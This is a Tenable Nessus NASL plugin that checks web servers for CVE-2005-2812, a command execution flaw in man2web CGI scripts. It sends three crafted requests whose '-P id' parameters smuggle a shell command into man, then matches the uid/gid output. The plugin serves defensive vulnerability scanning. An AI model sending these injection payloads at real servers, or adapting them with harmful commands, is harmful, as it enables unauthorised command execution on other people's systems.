#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#


include('deprecated_nasl_level.inc');
include('compat.inc');

if (description) {
  script_id(19591);
  script_version("1.15");

  script_cve_id("CVE-2005-2812");
  script_bugtraq_id(14747);

  script_name(english:"man2web Multiple Scripts Arbitrary Command Execution");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that allows for arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running man2web, a program for
dynamically converting unix man pages to HTML. 

The installed version of man2web allows attackers to execute arbitrary
shell commands on the remote host subject to the privileges of the web
server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/09/07");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/09/06");
 script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 
  script_summary(english:"Checks for command execution vulnerability in man2web");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2021 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);


# nb: not sure if this is from man2web.
http_check_remote_code(
  extra_dirs:"",
  check_request:"/man-cgi?-P%20id%20ls",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);

# nb: this is definitely part of man2web.
http_check_remote_code(
  extra_dirs:"",
  check_request:"/man2web?program=-P%20id%20ls",
  extra_check:"Man Page Lookup - -P id ls",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);

# nb: not sure if this is from man2web.
http_check_remote_code(
  extra_dirs:"",
  check_request:"/man2html?section=-P%20id&topic=w",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);


